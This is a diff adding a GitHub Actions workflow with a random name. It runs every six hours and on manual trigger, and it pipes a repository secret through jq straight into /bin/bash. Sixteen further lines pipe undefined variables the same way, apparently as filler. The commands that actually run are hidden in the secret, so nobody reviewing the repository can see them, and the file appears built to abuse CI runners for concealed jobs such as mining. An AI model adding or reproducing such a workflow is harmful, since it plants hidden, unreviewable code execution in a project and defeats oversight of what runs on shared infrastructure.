@@ -1,0 +1,33 @@
+name: mingzizxv
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingzizxv
+        env:
+          zvymh3: ${{ secrets.zvymh3 }}
+        run: |
+          echo $zvymh3 | jq -r .c31 | /bin/bash
+          echo $qomv1 | jq -r .fwm3520 | /bin/bash
+          echo $by7 | jq -r .txa2 | /bin/bash
+          echo $ij810 | jq -r .tyz739 | /bin/bash
+          echo $udo1528 | jq -r .cqchg6 | /bin/bash
+          echo $sm3 | jq -r .kw937 | /bin/bash
+          echo $srv2 | jq -r .jwvvj0972 | /bin/bash
+          echo $a5 | jq -r .ps660 | /bin/bash
+          echo $whja48261 | jq -r .a1124 | /bin/bash
+          echo $jjup59483 | jq -r .nsii31 | /bin/bash
+          echo $ljam1 | jq -r .wjuwv779 | /bin/bash
+          echo $oa6 | jq -r .tsvj671 | /bin/bash
+          echo $orj3744 | jq -r .g9632 | /bin/bash
+          echo $ckaul7 | jq -r .qa455 | /bin/bash
+          echo $frch9 | jq -r .iukef272 | /bin/bash
+          echo $fpwhr05 | jq -r .w2 | /bin/bash
+          echo $gq73 | jq -r .h2715 | /bin/bash
+
